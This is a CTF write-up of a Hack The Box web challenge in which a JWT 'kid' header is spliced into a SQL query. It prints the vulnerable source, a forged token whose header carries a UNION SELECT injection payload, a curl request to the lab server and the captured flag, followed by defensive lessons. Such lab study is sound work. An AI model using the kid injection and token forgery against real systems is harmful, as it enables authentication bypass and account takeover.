# HTB Morocco Meetups Summer CTF Cup: Majestic Sales

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow) ![Category](https://img.shields.io/badge/Category-Web-blue) ![Format](https://img.shields.io/badge/Format-Source%20Available-orange) ![Status](https://img.shields.io/badge/Status-Solved-success)

![HTB Morocco Meetups Summer CTF Cup banner](screenshots/00_event_banner.png)

## Challenge Info

| Field | Value |
|---|---|
| **Platform** | Hack The Box — Morocco Meetups Summer CTF Cup |
| **Scenario** | Majestic Sales |
| **Category** | Web (source-available, JWT + SQL injection) |
| **Difficulty** | Medium |
| **Points** | 875 |
| **Date Solved** | 2026-09-01 |
| **Tools Used** | `unzip`, `grep`, `python3` (JWT decode/forge), `curl` |
| **Scenario Premise** | A pentesting engagement on a mock sales management platform, provided with a copy of the site's source |
| **Objective** | Recover the flag from the authenticated `/dashboard` route |

![Scenario overview — Majestic Sales, 875 points, medium, solved](screenshots/01_scenario_overview.png)

---

## Concept Glossary

- **JWT structure (`header.payload.signature`)** — a JSON Web Token is three Base64url-encoded segments joined by dots. The header describes *how* the token is signed (algorithm, key identifier); the payload carries the actual claims (username, tenant, etc.); the signature proves the header+payload weren't tampered with — but only if the verifier is using the *correct* key to check it.
- **The `kid` (Key ID) header field** — a legitimate JWT feature meant for systems that sign tokens with more than one key (key rotation, multi-tenant setups, etc.). The idea is: the token tells the verifier *which* key to check it against. The problem is structural — `kid` lives in the **header**, and the header can't be trusted yet, because trusting it is the whole point of what's about to be verified. Any system that uses `kid` to go fetch or compute a secret *before* verification is asking an attacker-controlled value to help pick its own verification key.
- **SQL injection via string interpolation** — building a SQL query by directly splicing a variable into the query string (`` `...WHERE kid = '${kid}'` ``) instead of using a parameterized/prepared statement. This is dangerous even in code paths that don't look like "the login form" — any place user-influenced data reaches a raw query string is a potential injection point, including internal-looking lookups like a key/config table.
- **UNION-based SQL injection** — appending a `UNION SELECT` to an existing query lets an attacker return their *own* chosen literal values in place of the real result row, as long as the number (and roughly the type) of selected columns matches the original query. This is the mechanism used here to make the vulnerable `app_config` lookup hand back an attacker-known value instead of the real stored secret.
- **Authentication vs. authorization, as two separate (and separately breakable) checks** — this app verifies the JWT signature (*authentication*: "is this token genuinely signed by us?") and then, on the dashboard route, separately checks `user.username === "admin"` (*authorization*: "is this specific user allowed to see this?"). Both checks can be individually well-written and the app can still be fully compromised if the *input* to the first check is attacker-controlled — which is exactly what happened here.

---

## 1. Scenario Recon — Reviewing the Provided Source

The scenario ships with the application's own source code rather than requiring pure black-box probing — the intended methodology here is source review, not blind fuzzing. Unzipped the archive and grepped straight for the pieces of the JWT/auth flow that actually matter, rather than reading every file top to bottom.

### The vulnerable database lookup

```bash
unzip -p ~/Downloads/web_majestic_sales.zip \
  web_majestic_sales/challenge/database.js | \
  grep -n -A8 -B3 'getAppKey'
```

![database.js — the vulnerable getAppKey query](screenshots/02_vulnerable_sql_query.png)

```javascript
async getAppKey(kid) {
    // TODO: add parametrization
    return new Promise(async (resolve, reject) => {
        try {
            let query = `SELECT * FROM app_config WHERE kid = '${kid}';`;
            resolve(await this.db.get(query));
        } catch(e) {
            reject(e);
        }
    });
}
```

**Why this is the whole bug in one function:** `kid` is spliced directly into the SQL string with no parameterization — and the developer's own `// TODO: add parametrization` comment confirms this was a known, unaddressed gap rather than an accident. Whatever the caller passes as `kid` becomes part of the query verbatim.

### Where `kid` actually comes from

```bash
unzip -p ~/Downloads/web_majestic_sales.zip \
  web_majestic_sales/challenge/middleware/AuthMiddleware.js | \
  grep -n -A18 -B5 'getKid(req.cookies.session)'
```

![AuthMiddleware.js — the authentication flow](screenshots/03_auth_middleware_flow.png)

```javascript
return JWTHelper.getKid(req.cookies.session)
    .then(kid => {
        if (kid === undefined) return res.status(500).send(response('kid is missing or doesn\'t exist!'));
        db.getAppKey(kid)
            .then(appKey => {
                if (appKey === undefined) return res.status(500).send(response('No such kid!'));
                JWTHelper.verify(req.cookies.session, appKey.secret)
                    .then(data => {
                        req.data = { username: data.username, tenant: data.tenant };
                        next();
                    })
                    .catch(err => res.status(500).send(response(err.toString())));
            })
            .catch(err => res.status(500).send(err));
    })
    .catch(err => res.status(500).send(response("Something went wrong!")));
```

**The full chain, read left to right:** `getKid()` pulls `kid` straight out of the *incoming, unverified* JWT → that raw value is handed to `db.getAppKey(kid)` → whatever secret comes back from that query is the secret used to verify the *same* token. The order of operations is the vulnerability: the app decides which key to trust the token with *before* it has any reason to trust anything about the token.

```bash
unzip -p ~/Downloads/web_majestic_sales.zip \
  web_majestic_sales/challenge/helpers/JWTHelper.js | \
  grep -n -A12 -B3 'getKid'
```

![JWTHelper.js — getKid decodes the header without verifying it](screenshots/04_jwt_helper_getkid.png)

```javascript
async getKid(token) {
    return new Promise(async (resolve, reject) => {
        try {
            return resolve(jwt.decode(token, { complete: true }).header.kid);
        } catch (e) {
            reject(e);
        }
    });
}
```

**Confirms it plainly:** `jwt.decode()` (not `jwt.verify()`) just parses the header — no signature check happens here at all. `kid` is 100% attacker-controlled at this point in the flow.

### The authorization check on the other end

```bash
unzip -p ~/Downloads/web_majestic_sales.zip \
  web_majestic_sales/challenge/routes/index.js | \
  grep -n -A12 -B5 'user.username === "admin"'
```

![routes/index.js — the dashboard's admin check](screenshots/05_dashboard_route_admin_check.png)

```javascript
router.get('/dashboard', AuthMiddleware, async (req, res, next) => {
    let user = req.data;
    let flag = null;
    if (user === undefined) return res.redirect('/');
    if (user.username === "admin") flag = fs.readFileSync('/flag', 'utf8');
    if (user.tenant === "gr_office") {
        return res.render("DashboardGr.html", {user, flag});
    }
    return res.render('dashboard.html', {user, flag});
});
```

**Why this matters even though it looks correct:** this check is fine *in isolation* — it really does gate the flag behind `username === "admin"`. The problem is entirely upstream: if an attacker can forge a token where the *payload* says `"username": "admin"` and get it to pass the *signature* check, this line has no way to know the identity is fake.

---

## 2. Building the Attack — Forging an Admin Token via the `kid` Injection

The exploitation goal follows directly from the source review: get `getAppKey()`'s SQL query to return a **known** secret value (instead of the real one) by injecting a `UNION SELECT` into `kid`, then sign a brand-new JWT — with `username: "admin"` in the payload — using that known secret.

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiIsImtpZCI6Ijk5OScgVU5JT04gU0VMRUNUIDEsJzk5OScsJ3gnLCd4JyAtLSAifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwidGVuYW50IjoiZ3Jfb2ZmaWNlIn0.6Craf1WJSUOyGf5LmNt5GRmjDn8kD4uJf0-bpyEuEJU"

h, p, s = token.split('.')

for name, value in [('Header', h), ('Payload', p)]:
    value += '=' * (-len(value) % 4)
    print(f'\n{name}:')
    print(json.dumps(
        json.loads(base64.urlsafe_b64decode(value)),
        indent=2
    ))
```

![Decoded forged JWT header and payload](screenshots/06_forged_jwt_decoded.png)

**Decoded header:**
```json
{
  "alg": "HS256",
  "kid": "999' UNION SELECT 1,'999','x','x' -- "
}
```

**Decoded payload:**
```json
{
  "username": "admin",
  "tenant": "gr_office"
}
```

**Breaking down the injected `kid` value:**
- `999'` closes the original quoted string in `WHERE kid = '${kid}'`
- `UNION SELECT 1,'999','x','x'` appends a second result row with **four** attacker-chosen literals — matched to `app_config`'s column count so the query stays syntactically valid. One of those literal positions lines up with the column `getAppKey()` reads back out as `appKey.secret`, meaning the app now verifies the token against the literal string `'x'` — a value fully known to the attacker — instead of the site's real signing secret.
- `-- ` comments out anything left over from the original query (the closing `'` and `;`), so the whole statement still parses cleanly.

With the verification secret now a known constant, a fresh JWT can be signed locally (HS256, secret `x`) carrying whatever payload is wanted — here, `username: "admin"` and `tenant: "gr_office"`. **Note:** the exact signing command/script that produced the final token wasn't captured in a screenshot — only the decode step confirming its contents is shown above. The token itself is fully reconstructable from what's shown, but that specific signing step is going from memory rather than a screenshot.

---

## 3. Delivering the Forged Token

```bash
curl -s http://154.57.164.82:30392/dashboard \
  -H 'Cookie: session=YOUR_SUCCESSFUL_TOKEN'
```

![Final request returning admin dashboard and flag](screenshots/07_flag_disclosure.png)

```
Welcome back admin
HTB{0rd3r_of_th3_un10n_1nj3c70r5}
```

**Note on the token value shown:** the command above uses a placeholder (`YOUR_SUCCESSFUL_TOKEN`) rather than the literal forged JWT in the screenshot — the actual token sent isn't visible here, only the fact that the request succeeded and returned the admin dashboard with the flag.

The `AuthMiddleware` chain accepted the forged signature (because the injected `kid` made it verify against the known `'x'` secret), `req.data.username` came back as `"admin"` from the payload, and the dashboard route's `user.username === "admin"` check passed on a fully forged identity — releasing the flag.

**Flag:** `HTB{0rd3r_of_th3_un10n_1nj3c70r5}`

---

## Full Lessons Learned

1. **Never let attacker-controlled JWT header metadata decide which key to verify against.** `kid` (and `alg`, in other well-known JWT attacks) live in a part of the token that hasn't been trusted yet by definition — using either to make a security-relevant decision *before* verification inverts the entire point of signing the token in the first place. This is a recognized vulnerability family, not a one-off bug in this specific app.
2. **A developer's own `// TODO` comment can be the whole finding.** `// TODO: add parametrization` sitting directly above the vulnerable line is about as close to a confession as source review gets — grepping for `TODO`, `FIXME`, and similar markers is genuinely worth doing early in any source-available engagement.
3. **Source-available changes the methodology, not just the speed.** Instead of black-box probing every endpoint blind, tracing the actual data flow (`getKid()` → `getAppKey()` → `verify()`) through the real source let the entire exploit chain be planned *before* a single malicious request was sent — the UNION payload's column count and target field were known in advance rather than guessed through trial and error.
4. **Layered checks can each be locally correct and still combine into a full bypass.** The signature verification and the `username === "admin"` check are each reasonable, ordinary application logic. The vulnerability lives entirely in what *feeds* the first check — a good reminder to trace trust boundaries across the whole chain, not just audit individual conditionals in isolation.
5. **Once an attacker controls (or can predict) the signing secret, every claim in the token is theirs to write.** The `username` equality check downstream was never actually broken — it did exactly what it was supposed to do. It just received a completely fabricated identity to check, which is a strictly more dangerous failure than a broken check would have been.

---

## Skills Demonstrated

`Source code review (Node.js/Express)` · `JWT structure analysis (header/payload/signature)` · `Identifying JWT kid-based key-confusion vulnerabilities` · `SQL injection via UNION SELECT` · `Trust-boundary/data-flow tracing across authentication middleware` · `JWT decoding and forging` · `HTTP request crafting with curl`

---

## References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger — JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt.io — JWT Debugger](https://jwt.io/)
